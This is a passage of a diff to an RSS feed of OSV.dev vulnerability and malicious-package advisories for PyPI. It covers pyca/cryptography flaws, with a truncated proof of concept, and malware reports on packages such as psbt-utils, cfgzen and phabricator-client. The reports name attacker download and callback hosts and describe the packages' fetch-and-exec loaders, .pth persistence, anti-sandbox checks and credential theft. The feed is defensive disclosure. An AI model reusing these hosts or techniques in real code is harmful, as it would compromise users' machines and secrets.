@@ -3,12 +3,572 @@
   <title>OSV — new &amp; updated vulnerabilities: PyPI (Python)</title>
   <subtitle>Open-source vulns affecting PyPI (Python) packages, last 48h. Source: OSV.dev (CC-BY-4.0).</subtitle>
   <id>tag:cshintov.github.io,2026:osv-rss:pypi</id>
-  <updated>2026-08-05T00:38:11Z</updated>
+  <updated>2026-08-05T08:56:57Z</updated>
   <link rel="self" href="https://cshintov.github.io/osv-rss/pypi.xml"/>
   <link rel="alternate" href="https://osv.dev/"/>
   <author><name>osv-rss (data from OSV.dev)</name></author>
   <rights>Vulnerability data from OSV.dev and upstream sources (e.g. GitHub Advisory Database), licensed CC-BY-4.0.</rights>
   <generator uri="https://github.com/cshintov/osv-rss">osv-rss</generator>
+  <entry>
+    <title>[NEW] GHSA-m2h6-j472-rp4c: python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees</title>
+    <id>https://osv.dev/vulnerability/GHSA-m2h6-j472-rp4c</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-m2h6-j472-rp4c"/>
+    <published>2026-08-03T21:26:57Z</published>
+    <updated>2026-08-05T08:56:57Z</updated>
+    <category term="PyPI"/>
+    <category term="CVE-2026-69248"/>
+    <category term="PYSEC-2026-3554"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-69248, PYSEC-2026-3554&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:P&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cryptography&lt;/code&gt; — fixed in 49.0.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+If an intermediate constrained CA permits the DNS name `foo.example.com`, and the leaf certificate has a wildcard in its DNS SAN of `*.example.com`, python-cryptography&amp;#x27;s verifier accepts which allows escaping outside of the permitted names.
+
+### PoC
+
+```
+#!/usr/bin/env python3
+&amp;quot;&amp;quot;&amp;quot;Standalone PoC: pyca&amp;#x27;s DNSConstraint::matches admits a too-broad wildcard SAN.
+
+Setup:
+  Sub-CA permitted constraint: dNSName = foo.example.com
+  Leaf SAN:                    dNSName = *.example.com
+Expected: rejection (RFC 5280 §4.2.1.10 + standard wildcard semantics).
+Observed: pyca accepts; further, asks server-verifier whether the leaf is
+authoritative for `bar.example.com` and pyca answers yes — a sub-CA scope
+escape.
+&amp;quot;&amp;quot;&amp;quot;
+import datetime
+from cryptography import x509
+from cryptography.x509.oid im…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c"&gt;https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/pull/14888"&gt;https://github.com/pyca/cryptography/pull/14888&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2"&gt;https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography"&gt;https://github.com/pyca/cryptography&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-m2h6-j472-rp4c"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-jwv3-5hgf-82ww: python-cryptography: Duplicate self-signed intermediates can cause exponential path-building</title>
+    <id>https://osv.dev/vulnerability/GHSA-jwv3-5hgf-82ww</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-jwv3-5hgf-82ww"/>
+    <published>2026-08-03T21:26:50Z</published>
+    <updated>2026-08-05T08:56:56Z</updated>
+    <category term="PyPI"/>
+    <category term="CVE-2026-69249"/>
+    <category term="PYSEC-2026-3553"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;python-cryptography: Duplicate self-signed intermediates can cause exponential path-building&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-69249, PYSEC-2026-3553&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cryptography&lt;/code&gt; — fixed in 49.0.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+When resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack.
+
+This work was completed by Trail of Bits as part of the Patch The Planet project in collaboration with OpenAI. The finding was identified primarily by the Codex coding agent, and manually reviewed before submission. 
+
+### Details
+The core issue ari…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww"&gt;https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/pull/14960"&gt;https://github.com/pyca/cryptography/pull/14960&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582"&gt;https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography"&gt;https://github.com/pyca/cryptography&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-jwv3-5hgf-82ww"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-11520: Malicious code in psbt-utils (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-11520</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11520"/>
+    <published>2026-08-04T10:03:35Z</published>
+    <updated>2026-08-05T08:51:26Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in psbt-utils (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;psbt-utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (40293a9b1851f25decc83d08f82fab01f1f373d95e13dc937575b7182d470720)
+psbt-utils presents itself as a PSBT/Bitcoin wallet signing library handling WIF and hex private keys. update.py contains a _fetch_and_decrypt loader that retrieves an encrypted blob from https://curly-violet-87a9.ricardorichp.workers.dev/firmware, AES-256-GCM decrypts it with a key derived by SHA-256 of a hardcoded string (&amp;#x27;BIP-0174 PSBT... RFC 2024 draft&amp;#x27;), and passes the decrypted plaintext to exec() in a fresh namespace. The exec&amp;#x27;d code defines TelemetrySender.load and TelemetrySender.send, which are bound as _real_load/_real_send and reached through the package&amp;#x27;s top-level TelemetrySender exports. Execution is gated by an _is_real…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/psbt-utils"&gt;https://bad-packages.kam193.eu/pypi/package/psbt-utils&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/psbt-utils/1.0.0/"&gt;https://pypi.org/project/psbt-utils/1.0.0/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/domaup/coldcard-poc/commit/b283e8f995b0933008c281f2161ff01245d30253"&gt;https://github.com/domaup/coldcard-poc/commit/b283e8f995b0933008c281f2161ff01245d30253&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11520"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10916: Malicious code in python-devplatform-client (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10916</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10916"/>
+    <published>2026-07-18T14:13:52Z</published>
+    <updated>2026-08-05T07:21:41Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in python-devplatform-client (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;python-devplatform-client&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (8daa66fc6fa92869318e5a544d82fab2d5dff870dc4c6784f28733f84441415a)
+The package&amp;#x27;s setup.py copies a telemetry.pth file into site-packages so every Python interpreter startup on the host auto-imports _telemetry_init, which spawns a daemon thread invoking _telemetry_transport.Client.initialize(). That client selects a platform-keyed asset path (/pkg/package, /pkg/package-arm64, /pkg/loader_mac, /pkg/package.exe) from a list of anonymous Cloudflare Workers mirrors (package-proxy.cf5oobworker.workers.dev, cf8oobworker/cf12oobworker/cf17-ddb/cf25-6eb.workers.dev), downloads the binary with no version pinning or hash verification, chmods it 0o755, and executes it (Windows uses ctypes.windll.kernel32 CreatePr…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/python-devplatform-client"&gt;https://bad-packages.kam193.eu/pypi/package/python-devplatform-client&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection"&gt;https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection"&gt;https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection"&gt;https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection"&gt;https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://tria.ge/260720-teqmlshs6y/behavioral1"&gt;https://tria.ge/260720-teqmlshs6y/behavioral1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/python-devplatform-client/8.5.3/"&gt;https://pypi.org/project/python-devplatform-client/8.5.3/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/python-devplatform-client/8.5.4/"&gt;https://pypi.org/project/python-devplatform-client/8.5.4/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10916"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-11195: Malicious code in phabricator-client (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-11195</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11195"/>
+    <published>2026-07-30T08:51:50Z</published>
+    <updated>2026-08-05T07:21:41Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in phabricator-client (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;phabricator-client&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (43e718b20986295f99dd35066e46d0be5629555dccab79a1727cd3f5044cb7a0)
+phabricator-client 99.0.4 is a single-file PyPI package whose only runtime effect on import is to resolve lobohunter.duckdns.org and open a TCP connection to port 9999 on that host. The callout is unconditional and fires as soon as the module is imported, leaking the installer&amp;#x27;s public IP address and confirming code execution on the importing host to the operator of the DuckDNS endpoint. The package ships with placeholder metadata (no description, author, or homepage) and an implausibly inflated version number (99.0.4) intended to win resolution over an internal or lower-versioned package of a similar name — the standard dependency-con…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/phabricator-client"&gt;https://bad-packages.kam193.eu/pypi/package/phabricator-client&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/phabricator-client/99.0.4/"&gt;https://pypi.org/project/phabricator-client/99.0.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/phabricator-client/99.0.1/"&gt;https://pypi.org/project/phabricator-client/99.0.1/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/phabricator-client/99.0.0/"&gt;https://pypi.org/project/phabricator-client/99.0.0/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/phabricator-client/99.0.3/"&gt;https://pypi.org/project/phabricator-client/99.0.3/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/phabricator-client/99.0.2/"&gt;https://pypi.org/project/phabricator-client/99.0.2/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11195"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10869: Malicious code in paperclip-ai (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10869</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10869"/>
+    <published>2026-07-20T09:12:35Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in paperclip-ai (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;paperclip-ai&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (e26f6f66830ed0cc58e91483e1df3bc59e622f19078ae2dc88fa8d7f85933793)
+No install-time or import-time network I/O, credential access, dropper, silent-relay, or backdoor behavior was identified in this package version. No lifecycle hooks or suspicious build-backend activity were observed.
+
+## Source: kam193 (643de4cab1ea2f7becbca5a7dead46fcb39f35596d2bf7a371fdd2c82ded1530)
+A clone of a legitimate package with added code that exfiltrates env variables and multiple sensitive files: credentials, dotenv, shell history, etc. Exfiltrated credentials were quickly validated by the attacker.
+
+
+---
+
+Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.
+
+
+Campaign: 2026-07-browser-use-he…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/browser-use-headless/browser-use-headless-skill/blob/main/skills/browser-use-headless/SKILL.md?plain=1#L19"&gt;https://github.com/browser-use-headless/browser-use-headless-skill/blob/main/skills/browser-use-headless/SKILL.md?plain=1#L19&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/paperclip-ai"&gt;https://bad-packages.kam193.eu/pypi/package/paperclip-ai&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/paperclip-ai/0.1.1/"&gt;https://pypi.org/project/paperclip-ai/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10869"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10868: Malicious code in neroteam-v1 (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10868</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10868"/>
+    <published>2026-07-20T08:06:19Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in neroteam-v1 (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;neroteam-v1&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (e8a87642ea3c7a291704b2306a242bb496048571efcafb63835055f0871aed19)
+Importing the `nero` package triggers `nero/__init__.py` to load `nero.main`, whose top-level code runs a `_guard()` routine before executing a hidden payload. `_guard()` performs anti-debug checks (`sys.gettrace`, `sys.settrace(None)`, `_getframe().f_trace`), timing checks, and substring matching against sandbox/VM indicators (`sandbox`, `virtualbox`, `vmware`, `qemu`, `wine`, `hyperv`, `xen`) in PATH, the Python executable path, and processor identifiers. It then base64-decodes a ~110KB blob, decrypts it with a custom RC4-like keystream cipher keyed by the string `Cxdgs`, and passes the plaintext to `exec()`. The decrypted code is op…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/neroteam-v1"&gt;https://bad-packages.kam193.eu/pypi/package/neroteam-v1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.6/"&gt;https://pypi.org/project/neroteam-v1/1.0.6/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.5/"&gt;https://pypi.org/project/neroteam-v1/1.0.5/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.4/"&gt;https://pypi.org/project/neroteam-v1/1.0.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.7/"&gt;https://pypi.org/project/neroteam-v1/1.0.7/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.1/"&gt;https://pypi.org/project/neroteam-v1/1.0.1/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.2/"&gt;https://pypi.org/project/neroteam-v1/1.0.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.0/"&gt;https://pypi.org/project/neroteam-v1/1.0.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10868"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10701: Malicious code in discord-telemetry (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10701</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10701"/>
+    <published>2026-07-16T14:12:05Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in discord-telemetry (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;discord-telemetry&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (225e2e6a53c221447d09b6259d38d079c519056851186eb72405cb2904072c0b)
+No a static rule matches or traced code paths indicate exfiltration, install-time code execution, credential theft, silent-relay, backdoor, or self-propagation behavior in this package version. The package name references &amp;#x27;discord&amp;#x27; and &amp;#x27;telemetry&amp;#x27;, but a name alone is not a supply-chain threat and this version&amp;#x27;s contents do not exhibit any of the fingerprints (browser credential-store enumeration, Discord leveldb session theft, hardcoded C2 endpoint, install-time fetch-and-execute) that would justify escalation.
+
+## Source: kam193 (b8a926675ed9f43b0067def4bd625208d08a08c8750fd3c2f9f7bfd6138e3d4d)
+During installation, the package downlo…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file-analysis/ZWM2MzcwMWE4NzM5ZjY2MGYzZjBiYTY4NjA0Y2E4YmE6MTc4NDIxMDQzMA=="&gt;https://www.virustotal.com/gui/file-analysis/ZWM2MzcwMWE4NzM5ZjY2MGYzZjBiYTY4NjA0Y2E4YmE6MTc4NDIxMDQzMA==&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/discord-telemetry"&gt;https://bad-packages.kam193.eu/pypi/package/discord-telemetry&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/discord-telemetry/0.1.3/"&gt;https://pypi.org/project/discord-telemetry/0.1.3/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/discord-telemetry/0.1.0/"&gt;https://pypi.org/project/discord-telemetry/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/discord-telemetry/0.1.2/"&gt;https://pypi.org/project/discord-telemetry/0.1.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/discord-telemetry/0.1.1/"&gt;https://pypi.org/project/discord-telemetry/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/discord-telemetry/0.1.4/"&gt;https://pypi.org/project/discord-telemetry/0.1.4/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10701"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-11094: Malicious code in cfgzen (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-11094</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11094"/>
+    <published>2026-07-27T22:02:50Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in cfgzen (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cfgzen&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (a904eba641878bae63f76595a468b0faaa66fd27104ac557249e457f005c3fb1)
+The package installs a site-wide `cfgzen.pth` containing `import dotcfg`, which Python&amp;#x27;s site machinery executes automatically at every interpreter startup — turning every `python` invocation on the host into a trigger for the payload. On import, `dotcfg/__init__.py` spawns a detached background Python subprocess (env-gated with `_CFGZ_BG=1` and `CREATE_NO_WINDOW` on Windows) that re-imports the package and calls `_native.platform_check()` in the shipped Windows PyO3 extension `dotcfg/_native.pyd`. The native module contains: a hardcoded anonymous file-drop endpoint at `files.catbox.moe/7t4wyu.*`; WinHTTP and raw ws2_32 socket primitiv…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/051dc1df4ea14c71a25fea528090dd8cfd2c4e02030e6d2f91f6f2f9bad90ec3/detection"&gt;https://www.virustotal.com/gui/file/051dc1df4ea14c71a25fea528090dd8cfd2c4e02030e6d2f91f6f2f9bad90ec3/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://tria.ge/260727-1xjeksde39"&gt;https://tria.ge/260727-1xjeksde39&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/cfgzen"&gt;https://bad-packages.kam193.eu/pypi/package/cfgzen&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.6/"&gt;https://pypi.org/project/cfgzen/1.0.6/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.5/"&gt;https://pypi.org/project/cfgzen/1.0.5/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.2/"&gt;https://pypi.org/project/cfgzen/1.0.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.4/"&gt;https://pypi.org/project/cfgzen/1.0.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.3/"&gt;https://pypi.org/project/cfgzen/1.0.3/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11094"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-11416: Malicious code in ailaunchkit (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-11416</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11416"/>
+    <published>2026-07-31T14:52:16Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ailaunchkit (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ailaunchkit&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (998620f0a5d4d55fb3afccbaa210f7822a002db4b8ad09d5dae4954723264fb7)
+Package ailaunchkit version 0.1.2 on PyPI was scanned across 6 files with no static-rule matches and no traced behaviors indicating exfiltration, install-time remote code execution, silent relay, credential distribution, backdoor, or self-propagation. No lifecycle or import-time code paths were observed reading installer secrets, contacting attacker-controlled destinations, or fetching and executing remote content.
+
+## Source: kam193 (a11e86f01cbd23fcc0453904b7991ddaaf87582fde3bcc3b48686a28213c46d9)
+In this campaign, some packages (e.g. cognikit, aiassistcore) are pulled as dependencies and contain the C2 configuration and the maliciou…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://x.com/L0Psec/status/2066540845893861386"&gt;https://x.com/L0Psec/status/2066540845893861386&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/ailaunchkit"&gt;https://bad-packages.kam193.eu/pypi/package/ailaunchkit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/ailaunchkit/0.1.2/"&gt;https://pypi.org/project/ailaunchkit/0.1.2/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11416"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10866: Malicious code in nemopush (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10866</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10866"/>
+    <published>2026-07-20T05:15:31Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in nemopush (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nemopush&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
